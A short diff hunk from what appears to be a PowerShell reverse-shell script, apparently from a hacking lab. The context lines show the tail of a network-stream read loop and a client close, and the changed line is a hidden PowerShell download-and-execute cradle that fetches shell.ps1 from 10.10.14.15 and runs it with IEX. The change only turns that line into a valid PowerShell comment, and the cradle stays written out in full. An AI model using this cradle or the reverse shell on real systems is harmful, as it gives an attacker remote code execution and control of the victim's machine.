@@ -12,4 +12,4 @@ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
 };
 $client.Close()
 
-//powershell.exe -nop -w hidden -c IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.14.15/shell.ps1')
+#powershell.exe -nop -w hidden -c IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.14.15/shell.ps1')
